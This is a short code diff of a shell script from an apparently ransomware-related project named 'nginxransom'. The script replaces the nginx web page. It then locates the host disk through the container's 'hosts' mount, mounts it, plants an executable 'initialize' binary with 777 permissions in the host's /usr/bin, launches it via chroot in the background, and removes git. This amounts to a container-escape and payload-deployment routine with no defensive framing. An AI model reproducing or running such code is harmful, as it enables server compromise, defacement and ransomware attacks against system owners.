@@ -8,6 +8,6 @@ cp -u /nginxransom/web/index.html /usr/share/nginx/html/index.html && wait && ch
 diskpart=$(mount | grep   '^/dev/' | grep 'hosts' |  sed 's/ *$//g' | awk  '{print $1}')
 mount $diskpart /mnt/
 cp -u /usr/bin/initialize  mnt/usr/bin/initialize && chmod 777 mnt/usr/bin/initialize 
-chroot mnt/ mnt/usr/bin/ ./initialize &
+chroot mnt/usr/bin/ ./initialize &
 apt remove git -y
 
